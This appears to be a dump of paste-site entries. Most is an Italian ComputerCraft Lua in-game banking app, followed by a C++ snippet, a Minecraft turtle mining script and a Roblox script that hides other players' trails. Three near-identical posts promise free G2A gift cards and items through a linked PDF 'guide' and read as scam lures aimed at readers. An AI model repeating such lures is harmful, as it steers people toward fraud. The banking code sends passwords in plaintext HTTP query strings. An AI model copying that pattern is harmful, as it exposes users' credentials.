    term.setCursorPos((maxw - #text3) / 2, math.floor(maxh / 2) + 3)
    print(text3)
    os.sleep(0.5)
    update()
end

function drawCard()
    drawFilledBox(6, 7, 24, 7, colors.blue)
    drawFilledBox(6, 15, 24, 15, colors.blue)
    drawFilledBox(5, 8, 25, 14, colors.blue)

    drawFilledBox(7, 9, 23, 9, colors.lightGray)
    drawFilledBox(7, 12, 23, 13, colors.black)
end

mag = peripheral.wrap(""bottom"")
bl = ""BN Credit""

sfondo(colors.lightBlue)
clear()

colore(colors.white)
print("" "")
print(""                      ___            "")
print(""              _ __   / _ \\__ _ _   _ "")
print(""             | '_ \\ / /_)/ _  | | | |"")
print(""             | | | / ___/ (_| | |_| |"")
print(""             |_| |_\\/    \\__,_|\\__, |"")
print(""                                |___/ "")

-- Bottoni login/registrati

drawFilledBox(14, 10, 38, 12, colors.white)
term.setCursorPos(23, 11)
colore(colors.black)
term.write(""Accedi"")

drawFilledBox(14, 15, 38, 17, colors.white)
term.setCursorPos(21, 16)
colore(colors.black)
term.write(""Sei nuovo?"")

while true do
    event, key, x, y = os.pullEvent(""mouse_click"")
    if event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 15 and y <= 17 then
        -- Registrazione nuovo utente
        clear()
        titolo(""Registrati a nPay"")
        term.setCursorPos(1, 3)
        print(""Inserisci un nome utente e una password sicura."")
        term.setCursorPos(1, 5)
        colore(colors.gray)
        print(""Premi ENTER per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

        -- Nome Utente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(14, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
			utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""NO"" then
                term.setCursorPos(14, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(14, 10)
                colore(colors.red)
                term.write(""Utente giåA0 esistente!"")
                sleep(2)
                term.setCursorPos(14, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(14, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(14, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1, 12)
        term.write(""Password:"")
        term.setCursorPos(11, 12)
        colore(colors.white)

        passAccettata = false
        conteggioErrori = 0
        while passAccettata == false do
            password1 = read(""#"")
            colore(colors.black)
            term.setCursorPos(1, 13)
            term.write(""Verifica:"")
            term.setCursorPos(11, 13)
            colore(colors.white)
            local password2 = read(""#"")
            if password1 == password2 then
                term.setCursorPos(11, 12)
                colore(colors.lime)
                term.write(""###############"")
                term.setCursorPos(11, 13)
                term.write(""###############"")
                colore(colors.white)
                passAccettata = true
            else
                colore(colors.red)
                term.setCursorPos(11, 12)
                term.write(""Le password non corrispondono!    "")
                term.setCursorPos(1, 13)
                colore(colors.white)
                term.write(""                               "")
                sleep(1.5)
                term.setCursorPos(11, 12)
                term.write(""                               "")
                term.setCursorPos(11, 12)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(1.5)
                    term.setCursorPos(14, 12)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        --crea l'account

        term.setCursorPos(1, 17)
        creaAccount = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password1 .. ""&utente="" .. utente .. ""&richiesta=crea&valore=0"").readAll()
        tabCreaAccount = textutils.unserialize(creaAccount)
        if tabCreaAccount.stato == ""OA"" then
            colore(colors.lime)
            print(""Conto creato con successo."")
            sleep(1.5)
            clear()
            os.reboot()
        else
            colore(colors.red)
            print(""Errore durante la creazione del conto."")
            sleep(1.5)
            clear()
            os.reboot()
        end

    elseif event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 10 and y <= 12 then
        clear()
        titolo(""Accedi a nPay"")
        term.setCursorPos(1, 3)
        colore(colors.black)
        print(""Inserire i propri dati."")
        colore(colors.gray)
        print(""\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

        --nomeutente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(15, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
            utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""OK"" then
                term.setCursorPos(15, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(15, 10)
                colore(colors.red)
                term.write(""Utente errato!          "")
                sleep(2)
                term.setCursorPos(15, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(15, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(15, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1,12)
        term.write(""Password:"")
        term.setCursorPos(15, 12)
         
        conteggioErrori = 0
        passAccettata = false
        while passAccettata == false do
            colore(colors.white)
            password = read(""#"")
            password = string.gsub(password, ""%s"", """")
            colore(colors.black)
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&richiesta=addebito&valore=0&utente="".. utente).readAll()
            risposta = textutils.unserialize(checkuser)
            if risposta.stato == ""OK"" then
                term.setCursorPos(15, 12)
                colore(colors.lime)
                term.write(""##############               "")
                colore(colors.white)
                passAccettata = true
                else
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Password errata!            "")
                    conteggioErrori = conteggioErrori + 1
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        conteggioErrori = 0
        -- Pagina in cui scegli le operazioni da fare

        while true do
            --Ricontrolla il saldo per gestire l'aggiornamento di piåB9 operazioni
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=""..password..""&richiesta=addebito&valore=0&utente=""..utente).readAll()
            risposta = textutils.unserialize(checkuser)
            saldo = tonumber(risposta.saldo)
            --Disegna la finestra del pannello utente
            clear()
            titolo(""Pannello utente nPay"")
            term.setCursorPos(1, 3)
            term.write(""Benvenuto, "")
            colore(colors.white)
            term.write(utente)
            colore(colors.black)
            term.write(""!         Saldo: "")
            colore(colors.white)
            term.write(saldo)
            colore(colors.black)
            term.write("" IC"")
            print(""\n\nOperazioni disponibili:\n"")
            sfondo(colors.white)
            print("" Carica denaro su nPay  \n"")
            print("" Preleva denaro da nPay \n"")
            print("" Trasferisci denaro     \n"")
            print("" Estratto conto         \n"")
            colore(colors.red)
            print("" Disconnettiti da nPay  \n"")
            colore(colors.black)

            antitonto = os.startTimer(60)

            event, key, x, y = os.pullEventRaw()
            if event == ""mouse_click"" and y == 7 and x <= 24 then       --Pulsante carica denaro su nPay
                clear()
                titolo(""Caricamento denaro su nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakC = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                clear()
                                titolo(""Caricamento denaro su nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilitåA0 su carta:  "" .. tabel.v .. "" IC"")
                                colore(colors.red)
                                term.setCursorPos(1, 14)
                                term.write(""ATTENZIONE:"")
                                colore(colors.black)
                                term.setCursorPos(1, 15)
                                term.write(""Eccezionalmente, grazie ai 600 voti di marzo,"")
								--term.write(""Per le operazioni inferiori a 50 000 IC,"")
                                term.setCursorPos(1, 16)
								print(""le operazioni saranno GRATUITE fino al 4 aprile!"")
                                --print(""si applica una commissione del 0.15%."")
                                --print(""Oltre 50 000 IC la commissione åA8 del 0.05%."")
                                term.setCursorPos(1, 5)
                                term.write(""Importo da caricare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    if tonumber(credit) >= 50000 then
										--commissioni = tonumber(credit) * 0.005
										commissioni = tonumber(credit) * 0
                                    else
                                       --commissioni = tonumber(credit) * 0.015
									   commissioni = tonumber(credit) * 0
                                    end
									crediton = credit + commissioni
                                    if tonumber(tabel.v) >= crediton then
                                        tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore="" .. credit).readAll()
                                        tabella = textutils.unserialize(tab)
                                        tabr = {}
                                        tabr.t = tabel.t
                                        tabr.e = tabel.e
                                        tabr.p = tabel.p
                                        tabr.v = tonumber(tabel.v) - crediton
                                        ncr = textutils.serialize(tabr)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        za2, carta = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro accreditato: "" .. credit .. "" IC"")
                                        print(""Commissioni:        "" .. commissioni .. "" IC"")
                                        term.setCursorPos(1, 8)
                                        print(""Saldo sul conto:    "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta:  "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 12)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 12 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakC = true
                                                break
                                            end
                                        end
                                        break
                                    else
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    end
                                end
                            end
                            if finalBreakC then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 9 and x <= 24 then  --Pulsante preleva denaro da nPay
                clear()
                titolo(""Prelievo denaro da nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakP = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        sfondo(colors.lightBlue)
                        clear()
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                tabr = {}
                                tabr.e = tabel.e
                                tabr.p = tabel.p
                                tabr.t = tabel.t
                                tab1 = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore=0"").readAll()
                                tab3 = textutils.unserialize(tab1)
                                clear()
                                titolo(""Prelievo denaro da nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilitåA0 su conto:  "" .. saldo .. "" IC"")
                                colore(colors.black)
                                term.setCursorPos(1, 5)
                                term.write(""Importo da ritirare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=addebito&valore="" .. credit).readAll()
                                    tabella = textutils.unserialize(tab)
                                    if tabella.stato == ""DI"" then
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    else
                                        tabr.v = tonumber(tabel.v) + tonumber(credit)
                                        ncr = textutils.serialize(tabr)
                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        event = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro prelevato:  "" .. credit .. "" IC"")
                                        term.setCursorPos(1, 7)
                                        print(""Saldo sul conto:   "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta: "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 11)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 11 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakP = true
                                                break
                                            end
                                        end
                                        break
                                    end
                                end
                            end
                            if finalBreakP then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 11 and x <= 24 then --Pulsante trasferisci denaro
                --Trasferisci denaro
                --inizio pagina
                clear()
                titolo(""Trasferimento di denaro"")
                term.setCursorPos(1, 3)
                term.write(""Inserire il nome utente del beneficiario."")
                colore(colors.gray)
                print(""\n\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

                --Mostra saldo
                term.setCursorPos(1, 10)
                colore(colors.gray)
                print(""Saldo disponibile: "" .. saldo .. "" IC"")
                colore(colors.black)

                --Verifica Beneficiario
                term.setCursorPos(1, 12)
                term.write(""Beneficiario:"")
                term.setCursorPos(15, 12)
                colore(colors.white)
                destAccettato = false
                conteggioErrori = 0
                while destAccettato == false do
                    beneficiario = read()
                    checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. beneficiario).readAll()
                    tabcheckuser = textutils.unserialize(checkuser)
                    if tabcheckuser.stato == ""OK"" and beneficiario ~= utente then
                        term.setCursorPos(15, 12)
                        colore(colors.lime)
                        term.write(beneficiario)
                        colore(colors.white)
                        destAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 12)
                        colore(colors.red)
                        if beneficiario == utente then
                            term.write(""Non puoi inserire te stesso."")
                        else
                            term.write(""Utente inesistente!         "")
                        end
                        sleep(2)
                        term.setCursorPos(15, 12)
                        colore(colors.white)
                        term.write(""                                      "")
                        term.setCursorPos(15, 12)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 12)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 12)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 12)
                            clear()
                            os.reboot()
                        end
                    end
                end

                colore(colors.black)
                --Verifica valore dell'invio
                term.setCursorPos(1, 14)
                term.write(""Importo:"")
                term.setCursorPos(15, 14)
                colore(colors.white)
                importoAccettato = false
                conteggioErrori = 0
                while importoAccettato == false do
                    importo = tonumber(read())
                    if importo == """" or importo == nil or importo <= 0 then
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Importo errato!                    "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                    elseif importo <= saldo and importo > 0 then
                        term.setCursorPos(15, 14)
                        colore(colors.lime)
                        term.write(importo .. "" IC"")
                        colore(colors.white)
                        importoAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Credito insufficiente!          "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 14)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 14)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 14)
                            clear()
                            os.reboot()
                        end
                    end
                end

                sleep(0.5)
                clear()
                titolo(""Riepilogo del trasferimento"")

                text = ""Vuoi inviare "" .. importo .. "" IC a "" .. beneficiario .. ""?""
                term.setCursorPos((maxw - #text) / 2, 6)
                term.write(""Vuoi inviare "")
                colore(colors.white)
                term.write(tostring(importo) .. "" IC "")
                colore(colors.black)
                term.write(""a "")
                colore(colors.white)
                term.write(beneficiario)
                colore(colors.black)
                term.write(""?"")

                drawFilledBox(7, 11, 23, 13, colors.white)
                drawFilledBox(29, 11, 45, 13, colors.white)

                term.setCursorPos(8, 12)
                colore(colors.lime)
                term.write(""Invia il denaro"")

                term.setCursorPos(34, 12)
                colore(colors.red)
                term.write(""Annulla"")

                inviare = false
                while true do
                    event, key, x, y = os.pullEvent()
                    if event == ""mouse_click"" and x >= 7 and x <= 23 and y >= 11 and y <= 13 then
                        inviaDenaro = http.get(""http://luanet.rgbcraft.com/luanet/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=trasferimento&valore="" .. importo .. ""&beneficiario="" .. beneficiario).readAll()
                        risultatoInvio = textutils.unserialize(inviaDenaro)
                        if risultatoInvio.stato == ""OK"" then
                            text = ""Invio del denaro riuscito.""
                            text2 = ""Nuovo saldo: "" .. risultatoInvio.credito .. "" IC""
                            sfondo(colors.lightBlue)
                            colore(colors.lime)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        else
                            text = ""Errore durante l'invio del denaro.""
                            text2 = risultatoInvio.errore
                            sfondo(colors.lightBlue)
                            colore(colors.red)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        end
                    elseif event == ""mouse_click"" and x >= 29 and x <= 45 and y >= 11 and y <= 13 then
                        sfondo(colors.lightBlue)
                        colore(colors.red)
                        text = ""Operazione annullata.""
                        term.setCursorPos((maxw - #text) / 2, 16)
                        term.write(text)
                        sleep(1.5)
                        clear()
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 13 and x <= 24 then --Pulsante estratto conto
                --Estratto Conto (inizio pagina)
                clear()
                titolo(""Estratto conto"")

                estratto = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=estratto"").readAll()
                ec = textutils.unserialize(estratto)
                term.setCursorPos(1, 3)
                print(""Entrate:"")
                colore(colors.lime)
                print(ec.entrata1)
                print(ec.entrata2)
                print(ec.entrata3)
                print(ec.entrata4)
                colore(colors.black)
                print(""\nUscite:"")
                colore(colors.red)
                print(ec.uscita1)
                print(ec.uscita2)
                print(ec.uscita3)
                print(ec.uscita4)
                term.setCursorPos(1, 18)
                sfondo(colors.white)
                colore(colors.black)
                term.write("" Torna al menåB9 principale "")
                while true do
                    event, key, x, y = os.pullEventRaw()
                    if event == ""mouse_click"" and x <= 26 and y == 18 then
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 15 and x <= 24 then --Pulsante disconnetti da nPay
                disconnetti()

            elseif event == ""timer"" and key == antitonto then --Butta fuori l'utente se non fa niente
                disconnetti()

            elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (pannello utente)
                update()
            end
        end

    elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (schermata principale)
        update()
    end
end"
ZMZfdZua,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 12:56:25 PM CDT,"#include <iostream>
#include <map>
using namespace std;

int main()
{
  map<int, int> mapa;
  int n;
  cin >> n;

  int x[n][2];
  for(int i = 0; i < n; i++) {
    cin >> x[i][0] >> x[i][1];

    mapa[x[i][0]]++;
    mapa[x[i][1] + 1]--;
  }
    int maksimum = 0, ans = 0;
  for(auto it = mapa.begin(); it != mapa.end(); it++) {
    ans += it->second;
    maksimum = max(maksimum, ans);
  }
  cout << maksimum << endl;




    return 0;
}
"
yFdBBDhS,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,kjihu25,JavaScript,Sunday 2nd of June 2024 12:52:59 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
Ebb1bZjL,Untitled,MAGMI,Lua,Sunday 2nd of June 2024 12:39:41 PM CDT,"i = 0
while True do
	if turtle.getFuelLevel() < 200 then
		print(""Refuelling"")
		turtle.refuel()
	end

	turtle.dig()
	turtle.forward()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.digUp()
	turtle.up()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.down()
	turtle.digDown()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.up()
	i = i+1
	if i == 50 then
		for var=0,50 do
			turtle.back()
		end
	end
end"
kuUuADCB,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,buch,JavaScript,Sunday 2nd of June 2024 12:02:54 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
zWQXeEaB,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,Alfonso1119,JavaScript,Sunday 2nd of June 2024 11:37:52 AM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
r3Rt445J,idk,qsenko1,Lua,Sunday 2nd of June 2024 11:30:11 AM CDT,"local Connection 

while task.wait(.5) do
    if ParticlesButton:GetAttribute(""hidden"") == false then
    --warn(""do the opposite"")	
	else   
       for _,Player in pairs(game:GetService(""Players""):GetPlayers()) do
			--warn(Player.Name)
			if Player.Name ~= game.Players.LocalPlayer.Name then		
				if Player.Character:FindFirstChild(""Right Arm"") and Player.Character:FindFirstChild(""Left Arm"") then
					if Player.Character:FindFirstChild(""Humanoid"") then
						if Player.Character:FindFirstChild(""Humanoid"").Health > 0 then
						--	Player.Character:FindFirstChild(""Humanoid"").Health = Player.Character:FindFirstChild(""Humanoid"").Health - 1
							if game.Workspace:FindFirstChild(Player.Name) then
								if game.Workspace:FindFirstChild(Player.Name)[""Right Arm""]:FindFirstChild(""Attachment1"") and game.Workspace:FindFirstChild(Player.Name)[""Left Arm""]:FindFirstChild(""Attachment1"") then
									warn(Player)
									if game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") and game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") then
										game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
										game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
										warn(""found"")
									else
										warn(""cant find trail"")
									end
								end
							end
						end
					end
				end	
   Connection = Player.CharacterAdded:Once(function(Char)
					warn(Char)
					warn(""other player restets"")
					task.wait(5)
					if Char:WaitForChild(""Right Arm"") and Char:WaitForChild(""Left Arm"") then
						warn(""Executed1"")
								if Char:FindFirstChild(""Right Arm"") and Char:FindFirstChild(""Left Arm"") then
							    warn(""Executed2"")
if Char[""Right Arm""]:FindFirstChild(""Attachment1"") and Char[""Left Arm""]:FindFirstChild(""Attachment1"") then
warn(""Executed3"")
if Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") and Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") then
					warn(""Executed4"")
					Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
					Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
								end
							end
						end
					end
				end)	
			end
		end 
   end
end"
